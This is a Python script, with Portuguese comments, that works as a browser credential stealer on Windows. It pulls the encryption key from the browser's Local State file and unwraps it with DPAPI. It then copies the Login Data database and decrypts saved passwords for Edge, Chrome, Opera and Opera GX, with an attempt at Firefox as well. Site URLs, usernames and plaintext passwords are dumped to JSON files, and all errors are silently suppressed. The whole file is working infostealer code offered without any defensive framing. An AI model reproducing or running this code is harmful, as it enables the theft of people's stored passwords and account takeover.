import os
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil
from datetime import datetime, timedelta

def get_chrome_datetime(chromedate):
    """Converte um formato de data e hora do Chrome em um objeto `datetime.datetime`
    Como `chromedate` está formatado como o número de microssegundos desde janeiro, 1601"""
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)

def get_encryption_key(browser_path):
    local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", browser_path, "User Data", "Local State")
    
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.load(f)

    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

def decrypt_password(password, key):
    try:
        iv = password[3:15]
        password = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            return ""

def collect_passwords(browser_path, output_file_path):
    key = get_encryption_key(browser_path)
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", browser_path, "User Data", "default", "Login Data")
    
    filename = "BrowserData.db"
    shutil.copyfile(db_path, filename)
    
    db = sqlite3.connect(filename)
    cursor = db.cursor()
    resultados = []
    
    cursor.execute("SELECT origin_url, action_url, username_value, password_value, date_created, date_last_used FROM logins ORDER BY date_created")
    
    for row in cursor.fetchall():
        origin_url = row[0]
        action_url = row[1]
        username = row[2]
        password = decrypt_password(row[3], key)
        date_created = row[4]
        date_last_used = row[5]        
        
        if username or password:
            resultado = {
                "Origin URL": origin_url,
                "Action URL": action_url,
                "Username": username,
                "Password": password
            }
            resultados.append(resultado)
    
    with open(output_file_path, "w") as json_file:
        json.dump(resultados, json_file, indent=4)
    
    cursor.close()
    db.close()
    
    try:
        os.remove(filename)
    except:
        pass
 
if __name__ == "__main__":
    try:
        collect_passwords("Microsoft\\Edge", "edge_passwords.json")
    except:
        pass
    try:
        collect_passwords("Google\\Chrome", "chrome_passwords.json")
    except:
        pass
    try:
        collect_passwords("Opera Software\\Opera Stable", "opera_passwords.json")
    except:
        pass
    try:
        collect_passwords("Mozilla\\Firefox", "firefox_passwords.json")
    except:
        pass
    try:
        collect_passwords("Opera Software\\Opera GX Stable", "operaGX_passwords.json")
    except:
        pass
